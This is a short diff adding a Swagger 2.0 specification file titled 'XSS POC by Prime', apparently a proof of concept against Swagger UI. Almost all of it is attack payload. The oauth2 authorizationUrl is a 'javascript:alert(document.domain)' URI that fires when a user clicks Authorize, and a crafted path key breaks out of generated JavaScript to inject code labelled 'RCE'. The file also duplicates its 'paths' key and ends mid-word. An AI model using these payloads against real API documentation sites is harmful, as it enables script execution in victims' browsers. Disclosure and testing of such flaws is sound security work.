@@ -1,0 +1,16 @@
+swagger: '2.0'
+securityDefinitions:
+  a:
+    type: oauth2
+    authorizationUrl: javascript:alert(document.domain)//
+info:
+  version: "0.0.1"
+  title: XSS POC by Prime
+  description: Please Click Authorize!
+paths:
+  paths:
+  /a');};};return exports;}));console.log('RCE');(function(){}(this,function(){a=function(){b=function(){new Array(:
+    get:
+      responses:
+        200:
+          description: Successful respons
